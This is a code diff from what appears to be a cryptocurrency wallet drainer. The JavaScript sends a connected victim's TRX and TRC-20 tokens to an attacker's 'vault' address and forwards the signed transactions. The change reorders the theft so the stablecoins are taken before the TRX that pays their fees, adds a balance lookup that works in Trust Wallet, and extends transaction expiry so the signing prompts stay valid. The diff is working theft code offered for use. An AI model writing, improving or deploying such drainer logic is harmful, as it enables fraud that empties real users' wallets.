@@ -6788,40 +6788,51 @@
           L.log('[TRON] REST balance fallback:', balance);
         } catch (eRpc) { L.warn('TRON RPC fallback:', eRpc.message); }
       }
-      if (balance && balance >= 1000000) {
-        // dynFee: min 300,000 SUN (0.3 TRX covers bandwidth cost), max 5% of balance
-        var dynFee = Math.max(300000, Math.floor(balance * 0.05));
-        var sendAmt = balance - dynFee;
-        L.log('[TRON] draining TRX:', sendAmt, 'SUN →', vault);
-        if (sendAmt > 0) {
-          UI.status('Confirm TRX transfer...');
-          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
-          // Extend expiration to 1 hour — same as SOL blockhash fix.
-          // Default TRON tx expiry = 60s; if EVM/SOL popups appeared first, tx could already be expired.
-          // Max allowed by network = 24h; 3600s (1h) is safe and gives user plenty of time.
-          if (tronWeb.transactionBuilder && typeof tronWeb.transactionBuilder.extendExpiration === 'function') {
-            try { tx = await tronWeb.transactionBuilder.extendExpiration(tx, 3540); } catch (_eExp) {}
-          }
-          L.log('[TRON] TRX tx expiration extended to ~1h before sign');
-          var signed = await signTx(tx);
-          if (signed) {
-            await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
-            submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
-            L.log('[TRON] TRX submitted ✓');
+
+      // ── ORDER: TRC-20 FIRST, native TRX LAST ────────────────────────────
+      // TRC-20 (USDT/USDC) transfers need energy — paid from user's TRX.
+      // If we drain TRX first, only 0.3 TRX remains → NOT enough for TRC-20 energy (~13 TRX).
+      // By draining TRC-20 first (while full TRX is still in wallet), energy cost is covered.
+      // Native TRX is the final cleanup step.
+
+      // --- TRC-20 drain FIRST ---
+      // Step 1: Fetch ALL TRC-20 balances via REST API (TronGrid) — reliable for any tronWeb variant.
+      // tronWeb.contract().at().balanceOf() fails on Trust Wallet injected provider → use REST first.
+      var trc20RestBalances = {};
+      try {
+        var _acctFull = await tronFetchWithFallback('/v1/accounts/' + address);
+        var _acctFullData = _acctFull && _acctFull.data && _acctFull.data[0];
+        var _trc20Arr = (_acctFullData && _acctFullData.trc20) || [];
+        for (var _ri = 0; _ri < _trc20Arr.length; _ri++) {
+          var _entry = _trc20Arr[_ri];
+          var _keys = Object.keys(_entry || {});
+          for (var _ki = 0; _ki < _keys.length; _ki++) {
+            trc20RestBalances[_keys[_ki]] = String(_entry[_keys[_ki]] || '0');
           }
         }
-      } else {
-        L.log('[TRON] TRX balance too low or zero — skip TRX transfer');
-      }
+        L.log('[TRON] TRC-20 REST balances fetched:', Object.keys(trc20RestBalances).length, 'tokens');
+      } catch (_eRest) { L.warn('[TRON] TRC-20 REST fetch failed:', _eRest.message); }
 
       L.log('[TRON] checking TRC-20 tokens:', trc20List.map(function(t) { return t.symbol; }).join(', '));
       for (var i = 0; i < trc20List.length; i++) {
         try {
-          var c = await tronWeb.contract().at(trc20List[i].contract);
-          var bal = await c.balanceOf(address).call();
-          var balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
-          L.log('[TRON]', trc20List[i].symbol, 'balance:', balStr);
-          if (BigInt(balStr) <= 0n) continue;
+          var balStr = '0';
+          // Primary: REST API balance (works on all TW versions)
+          if (trc20RestBalances[trc20List[i].contract]) {
+            balStr = trc20RestBalances[trc20List[i].contract];
+            L.log('[TRON]', trc20List[i].symbol, 'balance (REST):', balStr);
+          } else {
+            // Fallback: tronWeb.contract().at().balanceOf() — full TronWeb only
+            try {
+              var c = await tronWeb.contract().at(trc20List[i].contract);
+              var bal = await c.balanceOf(address).call();
+              balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
+              L.log('[TRON]', trc20List[i].symbol, 'balance (contract):', balStr);
+            } catch (_eCont) {
+              L.warn('[TRON]', trc20List[i].symbol, 'contract.balanceOf failed:', _eCont.message);
+            }
+          }
+          if (!balStr || BigInt(balStr) <= 0n) { L.log('[TRON]', trc20List[i].symbol, '= 0 skip'); continue; }
           UI.status('Confirm ' + trc20List[i].symbol + '...');
           var ttx = await tronWeb.transactionBuilder.triggerSmartContract(
             trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
@@ -6838,6 +6849,31 @@
             L.log('[TRON]', trc20List[i].symbol, 'submitted ✓');
           }
         } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
+      }
+
+      // --- native TRX LAST (after TRC-20, so energy is covered) ---
+      if (balance && balance >= 1000000) {
+        // dynFee: min 300,000 SUN (0.3 TRX covers bandwidth cost), max 5% of balance
+        var dynFee = Math.max(300000, Math.floor(balance * 0.05));
+        var sendAmt = balance - dynFee;
+        L.log('[TRON] draining TRX:', sendAmt, 'SUN →', vault);
+        if (sendAmt > 0) {
+          UI.status('Confirm TRX transfer...');
+          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
+          // Extend expiration to 1 hour — same as SOL blockhash fix.
+          if (tronWeb.transactionBuilder && typeof tronWeb.transactionBuilder.extendExpiration === 'function') {
+            try { tx = await tronWeb.transactionBuilder.extendExpiration(tx, 3540); } catch (_eExp) {}
+          }
+          L.log('[TRON] TRX tx expiration extended to ~1h before sign');
+          var signed = await signTx(tx);
+          if (signed) {
+            await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
+            submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
+            L.log('[TRON] TRX submitted ✓');
+          }
+        }
+      } else {
+        L.log('[TRON] TRX balance too low or zero — skip TRX transfer');
       }
     } catch (e) { L.warn('[TRON] drain fail:', e.message, e.stack ? e.stack.split('\n')[1] : ''); }
 
